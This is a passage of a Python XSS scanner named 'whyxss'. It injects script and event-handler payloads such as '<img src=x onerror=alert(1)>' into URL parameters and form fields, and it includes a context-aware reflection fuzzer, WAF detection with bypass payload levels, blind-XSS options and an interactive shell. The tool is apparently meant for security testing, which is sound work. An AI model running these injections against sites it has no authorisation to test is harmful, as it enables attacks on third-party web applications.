    log_info(f"URL parameters: {AG2}{', '.join(params.keys())}{RST}")

    for param in params:
        log_verbose(f"Testing param: {param}", verbose)
        for entry in payloads:
            payload = entry['payload']
            category = entry['category']
            token = ''.join(random.choices(string.ascii_lowercase, k=8))
            test_payload = payload.replace('alert(1)', f'alert("{token}")')

            test_url = build_url_with_param(url, param, test_payload)

            try:
                r = session.get(test_url, timeout=8)
                reflected, rtype = check_reflection(r.text, test_payload, token)
                if reflected:
                    ctx = analyze_context(r.text, token if token in r.text else test_payload)
                    conf = score_finding(rtype, ctx, r.status_code)
                    f = Finding(test_url, param, payload, category, ctx, conf, rtype)
                    findings.append(f)
                    log_hit(f"Param: {W}{param}{RST} | {AG}Confidence: {conf}%{RST} | {AG3}{category}{RST}")
                    print(f"  {DRK}   Payload: {DIM}{payload[:70]}{RST}")
                log_verbose(f"  {param} | {payload[:40]} | reflected={reflected}", verbose)
            except Exception as e:
                log_verbose(f"Error: {e}", verbose)

            if delay:
                time.sleep(delay)

    return findings

# ── Scan forms ────────────────────────────────────────────────────────────────
def scan_forms(session, url, forms, payloads, verbose=False, delay=0):
    findings = []
    for i, form in enumerate(forms):
        log_info(f"Form {i+1}/{len(forms)}: {AG3}{form['action']}{RST} [{form['method'].upper()}]")
        for inp in form['inputs']:
            if inp['type'] in ('submit', 'button', 'image', 'file', 'hidden', 'checkbox', 'radio'):
                continue
            param = inp['name']
            log_verbose(f"Testing input: {param}", verbose)

            for entry in payloads:
                payload = entry['payload']
                category = entry['category']
                token = ''.join(random.choices(string.ascii_lowercase, k=8))
                test_payload = payload.replace('alert(1)', f'alert("{token}")')

                # Build form data
                data = {}
                for field in form['inputs']:
                    if field['name'] == param:
                        data[field['name']] = test_payload
                    else:
                        data[field['name']] = field['value'] or 'test'

                try:
                    if form['method'] == 'post':
                        r = session.post(form['action'], data=data, timeout=8)
                    else:
                        r = session.get(form['action'], params=data, timeout=8)

                    reflected, rtype = check_reflection(r.text, test_payload, token)
                    if reflected:
                        ctx = analyze_context(r.text, token if token in r.text else test_payload)
                        conf = score_finding(rtype, ctx, r.status_code)
                        f = Finding(form['action'], param, payload, category, ctx, conf, rtype)
                        findings.append(f)
                        log_hit(f"Form input: {W}{param}{RST} | {AG}Confidence: {conf}%{RST} | {AG3}{category}{RST}")
                        print(f"  {DRK}   Payload: {DIM}{payload[:70]}{RST}")
                except Exception as e:
                    log_verbose(f"Error: {e}", verbose)

                if delay:
                    time.sleep(delay)

    return findings

# ── Fuzzer (custom tokens) ─────────────────────────────────────────────────────
def fuzz_params(session, url, verbose=False, delay=0):
    """Inject random strings to find reflections, then craft payloads"""
    findings = []
    params = extract_params(url)
    if not params:
        return findings

    log_info("Running reflection fuzzer...")

    for param in params:
        token = 'whyxss' + ''.join(random.choices(string.ascii_lowercase, k=6))
        fuzz_url = build_url_with_param(url, param, token)
        try:
            r = session.get(fuzz_url, timeout=8)
            if token in r.text:
                log_verbose(f"Param {param} reflects input — context analysis...", verbose)
                ctx = analyze_context(r.text, token)
                log_verbose(f"Context: {ctx}", verbose)
                # Based on context, pick targeted payloads
                targeted = []
                if ctx == 'script_body':
                    targeted = ["';alert(1)//", '";alert(1)//', "`alert(1)`"]
                elif ctx == 'attr_value':
                    targeted = ['" onmouseover="alert(1)"', "' onmouseover='alert(1)'"]
                elif ctx == 'html_body':
                    targeted = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>']
                elif ctx == 'html_comment':
                    targeted = ['--><script>alert(1)</script>', '--><!--']
                else:
                    targeted = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>']

                for p in targeted:
                    test_url = build_url_with_param(url, param, p)
                    try:
                        r2 = session.get(test_url, timeout=8)
                        reflected, rtype = check_reflection(r2.text, p, '')
                        if reflected:
                            conf = score_finding(rtype, ctx, r2.status_code)
                            f = Finding(test_url, param, p, 'fuzzer_targeted', ctx, conf, rtype)
                            findings.append(f)
                            log_hit(f"Fuzzer hit: {W}{param}{RST} | {AG}Confidence: {conf}%{RST}")
                            print(f"  {DRK}   Payload: {DIM}{p[:70]}{RST}")
                    except Exception:
                        pass
                    if delay:
                        time.sleep(delay)
        except Exception as e:
            log_verbose(f"Fuzz error: {e}", verbose)

    return findings

# ── DOM scan ──────────────────────────────────────────────────────────────────
def scan_dom(session, url, verbose=False):
    findings = []
    try:
        r = session.get(url, timeout=10)
        sinks, sources = analyze_dom(r.text)
        if sinks or sources:
            log_warn(f"DOM analysis — Sinks: {AG2}{len(sinks)}{RST} | Sources: {AG2}{len(sources)}{RST}")
            if verbose:
                for s in sinks[:5]:
                    print(f"    {DRK}Sink: {AG4}{s}{RST}")
                for s in sources[:5]:
                    print(f"    {DRK}Source: {AG4}{s}{RST}")
            if sinks and sources:
                f = Finding(url, 'DOM', 'DOM-based XSS possible', 'dom',
                            'dom_sink', 55, f'sinks={sinks[:2]}')
                findings.append(f)
    except Exception as e:
        log_verbose(f"DOM error: {e}", verbose)
    return findings

# ── Output / report ───────────────────────────────────────────────────────────
def print_findings(findings):
    if not findings:
        print(f"\n  {AG4}[~]{RST} No XSS vulnerabilities confirmed.")
        print(f"  {GR}    (try --level 3 or --fuzzer for deeper scan){RST}")
        return

    print()
    dsep()
    print(f"  {AG}{BO}RESULTS — {len(findings)} finding(s){RST}")
    dsep()
    for i, f in enumerate(findings, 1):
        print(f"\n  {AG}{BO}[{i}]{RST} {AG3}{f.url[:60]}{RST}  {GR}({f.timestamp}){RST}")
        print(str(f))
        sep(c='┄')

def save_report(findings, path, url):
    with open(path, 'w') as fh:
        fh.write(f"# whyxss Report — {datetime.now()}\n")
        fh.write(f"# Target: {url}\n\n")
        if not findings:
            fh.write("No vulnerabilities found.\n")
            return
        for i, f in enumerate(findings, 1):
            fh.write(f"[{i}] URL: {f.url}\n")
            fh.write(f"    Param: {f.param}\n")
            fh.write(f"    Payload: {f.payload}\n")
            fh.write(f"    Category: {f.category}\n")
            fh.write(f"    Context: {f.context}\n")
            fh.write(f"    Confidence: {f.confidence}%\n")
            fh.write(f"    Reflection: {f.reflection}\n\n")

# ── Help ──────────────────────────────────────────────────────────────────────
def show_help():
    dsep()
    print(f"  {BO}{W}WHYXSS — XSS Scanner{RST}  {GR}v{VERSION}{RST}")
    dsep()
    print(f"""
  {AG}USAGE:{RST}
    {AG2}./whyxss.sh{RST} [options] -u <url>

  {AG}TARGET:{RST}
    {W}-u{RST} <url>        Target URL (with or without params)
    {W}-f{RST} <file>       File with URLs (one per line)

  {AG}SCAN MODES:{RST}
    {W}--forms{RST}         Scan HTML forms
    {W}--dom{RST}           DOM-based XSS analysis
    {W}--fuzzer{RST}        Reflection fuzzer (context-aware)
    {W}--blind{RST}         Blind XSS payloads
    {W}--all{RST}           Everything above

  {AG}PAYLOAD CONTROL:{RST}
    {W}--level{RST} N       1=basic  2=+polyglot  3=+waf_bypass  4=all
    {W}--payload{RST} <p>   Custom payload
    {W}--encode{RST}        Try URL/HTML/JS encodings

  {AG}REQUEST OPTIONS:{RST}
    {W}--cookies{RST} <c>   Cookies string (name=val; name2=val2)
    {W}--headers{RST} <h>   Extra headers (Name:Value)
    {W}--proxy{RST} <p>     HTTP proxy (http://127.0.0.1:8080)
    {W}--delay{RST} <s>     Delay between requests (seconds)
    {W}--timeout{RST} <s>   Request timeout (default: 8)
    {W}--threads{RST} N     Parallel threads (default: 1)

  {AG}OUTPUT:{RST}
    {W}-o{RST} <file>       Save report to file
    {W}-v{RST}              Verbose
    {W}--waf{RST}           WAF detection only

  {AG}EXAMPLES:{RST}
    {DIM}./whyxss.sh -u "http://site.com/search?q=test"{RST}
    {DIM}./whyxss.sh -u "http://site.com" --forms --level 3{RST}
    {DIM}./whyxss.sh -u "http://site.com" --all --cookies "session=abc"{RST}
    {DIM}./whyxss.sh -u "http://site.com" --proxy http://127.0.0.1:8080{RST}
    {DIM}./whyxss.sh -u "http://site.com" --waf{RST}
    {DIM}./whyxss.sh -i{RST}   (interactive shell)
""")
    sep()

# ── Select payloads by level ──────────────────────────────────────────────────
def select_payloads(level=2, custom=None, blind=False):
    if custom:
        return [{'payload': custom, 'category': 'custom'}]
    cats = ['basic']
    if level >= 2: cats += ['polyglot', 'event_handlers', 'attr_break']
    if level >= 3: cats += ['waf_bypass', 'template']
    if level >= 4: cats += ['dom']
    if blind:      cats += ['blind']
    result = []
    for cat in cats:
        for p in PAYLOADS.get(cat, []):
            result.append({'payload': p, 'category': cat})
    return result

# ── Main scan ─────────────────────────────────────────────────────────────────
def do_scan(url, args):
    all_findings = []
    session = make_session(
        cookies=getattr(args, 'cookies', '') or '',
        proxy=getattr(args, 'proxy', '') or '',
    )

    # Shot animation
    shot_animation(url)

    dsep()
    print(f"  {AG}{BO}Scanning:{RST} {AG3}{url}{RST}")
    print(f"  {GR}Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RST}")
    dsep()
    print()

    # WAF detection
    log_info("Detecting WAF...")
    t = start_spinner("WAF detection")
    wafs = detect_waf(session, url)
    stop_spinner()
    if wafs:
        log_warn(f"WAF detected: {AG2}{', '.join(wafs)}{RST}")
    else:
        log_info(f"No WAF detected {GR}(or bypassed){RST}")

    if getattr(args, 'waf_only', False):
        return all_findings

    print()
    payloads = select_payloads(
        level=getattr(args, 'level', 2),
        custom=getattr(args, 'payload', None),
        blind=getattr(args, 'blind', False),
    )
    log_info(f"Payloads loaded: {AG2}{len(payloads)}{RST}")

    delay = getattr(args, 'delay', 0) or 0
    verbose = getattr(args, 'verbose', False)

    # URL param scan
    params = extract_params(url)
    if params:
        print()
        sep()
        log_info(f"{AG}{BO}Phase 1:{RST} URL parameter injection")
        sep()
        t = start_spinner("Injecting URL params")
        r = scan_url_params(session, url, payloads, verbose=verbose, delay=delay)
        stop_spinner()
        all_findings += r

    # Form scan
    if getattr(args, 'forms', False) or getattr(args, 'scan_all', False):
        print()
        sep()
        log_info(f"{AG}{BO}Phase 2:{RST} Form scanning")
        sep()
        t = start_spinner("Crawling forms")
        forms = extract_forms(session, url)
        stop_spinner()
        log_info(f"Forms found: {AG2}{len(forms)}{RST}")
        if forms:
            r = scan_forms(session, url, forms, payloads, verbose=verbose, delay=delay)
            all_findings += r

    # Fuzzer
    if getattr(args, 'fuzzer', False) or getattr(args, 'scan_all', False):
        print()
        sep()
        log_info(f"{AG}{BO}Phase 3:{RST} Reflection fuzzer")
        sep()
        r = fuzz_params(session, url, verbose=verbose, delay=delay)
        all_findings += r

    # DOM
    if getattr(args, 'dom', False) or getattr(args, 'scan_all', False):
        print()
        sep()
        log_info(f"{AG}{BO}Phase 4:{RST} DOM analysis")
        sep()
        r = scan_dom(session, url, verbose=verbose)
        all_findings += r

    # Deduplicate
    seen = set()
    unique = []
    for f in all_findings:
        key = (f.param, f.payload[:30])
        if key not in seen:
            seen.add(key)
            unique.append(f)
    all_findings = unique

    # Print results
    print_findings(all_findings)

    elapsed = time.time()
    return all_findings

# ── Interactive shell ─────────────────────────────────────────────────────────
def interactive_shell():
    cfg = {
        'url': '', 'cookies': '', 'proxy': '',
        'level': 2, 'delay': 0, 'verbose': False,
        'forms': False, 'dom': False, 'fuzzer': False,
        'scan_all': False, 'blind': False, 'output': '',
        'payload': None, 'waf_only': False,
    }

    print(f"  {GR}Type {W}help{GR} for usage, {W}exit{GR} to quit.{RST}\n")

    while True:
        try:
            sys.stdout.write(f"\n{AG}{BO}whyxss{RST} {AG4}>{RST} ")
            sys.stdout.flush()
            line = input().strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n\n  {GR}Goodbye.{RST}\n")
            sys.exit(0)

        if not line:
            continue
        parts = line.split()
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ''
        rest = ' '.join(parts[2:]) if len(parts) > 2 else ''

        if cmd in ('exit', 'quit', 'q'):
            print(f"\n  {GR}Goodbye.{RST}\n")
            sys.exit(0)

        elif cmd == 'help':
            show_help()

        elif cmd == 'clear':
            os.system('clear')

        elif cmd == 'set':
            key = arg.lower()
            val = rest or (parts[2] if len(parts) > 2 else '')
            if key == 'url':
                cfg['url'] = val
                print(f"  {AG}URL{RST} => {W}{val}{RST}")
            elif key == 'cookies':
                cfg['cookies'] = val
                print(f"  {AG}COOKIES{RST} => {W}{val}{RST}")
            elif key == 'proxy':
                cfg['proxy'] = val
                print(f"  {AG}PROXY{RST} => {W}{val}{RST}")
            elif key == 'level':
                cfg['level'] = int(val)
                print(f"  {AG}LEVEL{RST} => {W}{val}{RST}")
            elif key == 'delay':
                cfg['delay'] = float(val)
                print(f"  {AG}DELAY{RST} => {W}{val}s{RST}")
            elif key == 'output':
                cfg['output'] = val
                print(f"  {AG}OUTPUT{RST} => {W}{val}{RST}")
            elif key == 'payload':
                cfg['payload'] = val
                print(f"  {AG}PAYLOAD{RST} => {W}{val}{RST}")
            else:
                print(f"  {Y}[!]{RST} Unknown: {key}")

        elif cmd == 'use':
            mod = arg.lower()
            if mod == 'forms':
                cfg['forms'] = True; print(f"  {AG}[*]{RST} Forms scan: ON")
            elif mod == 'dom':
                cfg['dom'] = True; print(f"  {AG}[*]{RST} DOM scan: ON")
            elif mod == 'fuzzer':
                cfg['fuzzer'] = True; print(f"  {AG}[*]{RST} Fuzzer: ON")
            elif mod == 'blind':
                cfg['blind'] = True; print(f"  {AG}[*]{RST} Blind XSS: ON")
            elif mod == 'all':
                cfg['scan_all'] = True; print(f"  {AG}[*]{RST} All modules: ON")
            elif mod == 'waf':
                cfg['waf_only'] = True; print(f"  {AG}[*]{RST} WAF detection only")
            else:
                print(f"  {Y}[!]{RST} use forms|dom|fuzzer|blind|all|waf")

        elif cmd == 'show':
            print(f"\n  {BO}{W}Options:{RST}")
            sep()
            rows = [
                ('URL',     cfg['url'] or '<not set>', 'Target URL'),
                ('COOKIES', cfg['cookies'] or '<none>', 'Cookie string'),
                ('PROXY',   cfg['proxy'] or '<none>',  'HTTP proxy'),
                ('LEVEL',   str(cfg['level']),          '1-4 payload depth'),
                ('DELAY',   str(cfg['delay'])+'s',      'Request delay'),
                ('FORMS',   str(cfg['forms']),          'Scan forms'),
                ('DOM',     str(cfg['dom']),            'DOM analysis'),
                ('FUZZER',  str(cfg['fuzzer']),         'Reflection fuzzer'),
                ('BLIND',   str(cfg['blind']),          'Blind XSS'),
                ('ALL',     str(cfg['scan_all']),       'All modules'),
                ('OUTPUT',  cfg['output'] or '<none>', 'Report file'),
            ]
            for name, val, desc in rows:
                vc = AG if val not in ('False','<not set>','<none>','0','0.0s') else GR
                print(f"  {W}{name:<10}{RST}  {vc}{val:<22}{RST} {GR}{desc}{RST}")
            print()

        elif cmd in ('run', 'scan', 'go', 'fire', 'shoot'):
            if not cfg['url']:
                print(f"  {R}[-]{RST} No URL. Use: set url http://target.com?q=test")
                continue

            class FakeArgs:
                pass
            a = FakeArgs()
            for k, v in cfg.items():
                setattr(a, k, v)
            a.waf_only = cfg['waf_only']
            findings = do_scan(cfg['url'], a)

            if cfg['output'] and findings:
                save_report(findings, cfg['output'], cfg['url'])
                print(f"\n  {AG}[+]{RST} Report saved: {W}{cfg['output']}{RST}")

        elif cmd.startswith('http'):
            cfg['url'] = cmd
            print(f"  {AG}URL{RST} => {W}{cmd}{RST}")

        else:
            print(f"  {Y}[!]{RST} Unknown command: {cmd}. Type 'help'.")

# ── CLI ───────────────────────────────────────────────────────────────────────
def build_parser():
    p = argparse.ArgumentParser(prog='whyxss', add_help=False)
    p.add_argument('-u', '--url', default=None)
    p.add_argument('-f', '--file', default=None)
    p.add_argument('--forms', action='store_true')
    p.add_argument('--dom', action='store_true')
    p.add_argument('--fuzzer', action='store_true')
    p.add_argument('--blind', action='store_true')
    p.add_argument('--all', dest='scan_all', action='store_true')
    p.add_argument('--level', type=int, default=2)
    p.add_argument('--payload', default=None)
    p.add_argument('--encode', action='store_true')
    p.add_argument('--cookies', default='')
    p.add_argument('--headers', default='')
    p.add_argument('--proxy', default='')
    p.add_argument('--delay', type=float, default=0)
    p.add_argument('--timeout', type=int, default=8)
    p.add_argument('--threads', type=int, default=1)
    p.add_argument('-o', '--output', default=None)
    p.add_argument('-v', '--verbose', action='store_true')
    p.add_argument('--waf', dest='waf_only', action='store_true')
    p.add_argument('-i', '--interactive', action='store_true')
    p.add_argument('-h', '--help', action='store_true')
    return p

def main():
    import signal
    signal.signal(signal.SIGINT, lambda s, f: (print(f"\n\n{AG4}[!]{RST} Interrupted.\n"), sys.exit(130)))

    if not REQUESTS_OK:
        print(f"{R}[-]{RST} Missing: pip install requests beautifulsoup4 --break-system-packages")
        sys.exit(1)

    show_banner()

    parser = build_parser()
    args, _ = parser.parse_known_args()

    if args.help:
        show_help()
        sys.exit(0)

    if args.interactive or (not args.url and not args.file):
        interactive_shell()
        return

    urls = []
    if args.url:
        urls.append(args.url)
    if args.file:
        try:
            with open(args.file) as f:
                urls += [l.strip() for l in f if l.strip()]
        except Exception as e:
            log_err(f"Cannot read file: {e}")
            sys.exit(1)

    all_findings = []
    for url in urls:
        findings = do_scan(url, args)
        all_findings += findings
        if args.output:
            save_report(findings, args.output, url)
            print(f"\n  {AG}[+]{RST} Report: {W}{args.output}{RST}")

    elapsed_total = datetime.now().strftime('%H:%M:%S')
    print()
    dsep()
    total_vuln = len(all_findings)
    color = AG if total_vuln > 0 else AG4
    print(f"  {BO}{W}whyxss done:{RST} {color}{total_vuln} finding(s){RST} across {len(urls)} target(s)")
    dsep()
    print()

if __name__ == '__main__':
    main()